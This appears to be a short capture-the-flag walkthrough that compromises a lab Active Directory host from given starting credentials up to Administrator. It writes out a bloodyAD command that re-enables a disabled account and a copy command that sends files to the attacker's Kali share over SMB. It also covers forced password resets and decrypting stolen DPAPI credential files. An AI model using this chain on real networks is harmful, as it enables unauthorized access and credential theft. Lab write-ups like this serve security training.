Initial credentials have been given: levi.james:KingofAkron2025!
Using those credentials, obtained Bloodhound-ingestable data using `bloodhound-python`
Then from bloodhound, followed the steps to get ant.edwards user
Then from bloodhound, noticed that ant.edwards user can change the password of adam.silver but after changing, cannot access it due to adam's account being disabled.
Resetting the machine did not help, so found this command with bloodyAD to re-enable it:
`bloodyAD -u <USERNAME-YOU-CONTROL> -p <PASSWORD> --host 10.129.196.197 remove uac <DISABLED-ACCOUNT> -f ACCOUNTDISABLE`
After re-enabling adam's account, can winrm into it, once inside, checked adam's own home folder, found the user.txt but no other useful info.
Went to C:\, and found some storage folder, went in explored a bit, found nothing, went back to C:\
Started to go from first folder and explore one by one. In the first folder, there's a site backup zip file. Exfiltrated it via SMB (setup impacket-smbserver in kali and used `copy FILE \\KALI-IP\share`)
Unzipped, found password for steph, bloodhound didn't show anything, so ran winpeas on steph's winrm session, winpeas showed something about DPAPI credential and master key files.
Exfiltrated the masterkey and cred files to kali machine and then used impacket-dpapi to decrypt masterkey first, then use the decyrpted key to decrypt the cred files.
One of the cred files have the steph.cooper_adm cred and then used that credential to winrm but inside steph.cooper_adm, there's nothing.
So went back to bloodhound and they say steph.cooper_adm can force change Administrator's password.
once changed administrator's password, can winrm into administrator and then get root.txt
